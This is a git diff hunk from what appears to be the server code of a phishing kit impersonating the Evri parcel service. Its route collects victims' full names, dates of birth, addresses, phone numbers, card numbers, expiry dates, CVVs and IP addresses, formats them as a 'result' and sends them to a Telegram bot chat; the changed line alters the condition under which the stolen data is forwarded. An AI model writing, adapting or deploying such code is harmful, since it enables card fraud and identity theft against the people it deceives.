@@ -12414,7 +12414,7 @@ app.post("/haytchEvri", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (aug25 == 3) {
+      if (aug25 == 1) {
         axios
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=HAYTCHRES:\n${originalText}`
